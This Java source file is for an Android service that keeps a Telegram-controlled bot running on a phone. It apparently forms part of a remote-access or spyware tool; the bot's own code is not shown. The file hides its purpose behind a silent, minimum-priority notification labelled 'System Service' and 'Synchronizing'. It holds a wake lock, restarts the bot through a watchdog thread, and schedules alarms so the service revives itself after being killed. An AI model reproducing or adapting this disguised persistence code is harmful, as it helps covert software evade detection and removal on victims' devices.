// language: Java, file: KeepAliveService.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;

public class KeepAliveService extends Service {

    static final String CHANNEL = "sys";
    static final int NID = 0x1001;
    static final long WATCHDOG_MS = 15 * 60_000L;

    PowerManager.WakeLock wl;
    AlarmManager am;
    Thread dog;

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(NID, buildNotification());
        acquireWakeLock();
        am = (AlarmManager) getSystemService(ALARM_SERVICE);

        // bot core
        TelegramBot.start(getApplicationContext());

        // watchdog — every 60s checks poller heartbeat
        dog = new Thread(this::watchdog, "v2-dog");
        dog.setDaemon(true);
        dog.start();

        scheduleWatchdog(WATCHDOG_MS);
    }

    void watchdog() {
        while (true) {
            try { Thread.sleep(60_000L); }
            catch (InterruptedException e) { return; }

            if (!TelegramBot.isAlive(120_000L)) {
                TelegramBot.restart();
            }
            if (wl != null && !wl.isHeld()) {
                try { wl.acquire(); } catch (Throwable ignored) {}
            }
            scheduleWatchdog(WATCHDOG_MS);
        }
    }

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        releaseWakeLock();
        scheduleWatchdog(5_000L);
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent i) { return null; }

    Notification buildNotification() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(CHANNEL, "System",
                NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            ch.enableVibration(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                .createNotificationChannel(ch);
        }
        return new Notification.Builder(this, CHANNEL)
            .setContentTitle("System Service")
            .setContentText("Synchronizing")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .build();
    }

    void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "v2:sync");
            wl.setReferenceCounted(false);
            wl.acquire();
        } catch (Throwable ignored) {}
    }

    void releaseWakeLock() {
        try {
            if (wl != null && wl.isHeld()) wl.release();
        } catch (Throwable ignored) {}
    }

    void scheduleWatchdog(long delayMs) {
        try {
            Intent i = new Intent(this, WatchdogReceiver.class)
                .setAction(WatchdogReceiver.ACTION);
            PendingIntent pi = PendingIntent.getBroadcast(this, 0, i,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            long when = System.currentTimeMillis() + delayMs;
            if (Build.VERSION.SDK_INT >= 23)
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, when, pi);
            else
                am.setExact(AlarmManager.RTC_WAKEUP, when, pi);
        } catch (Throwable ignored) {}
    }
}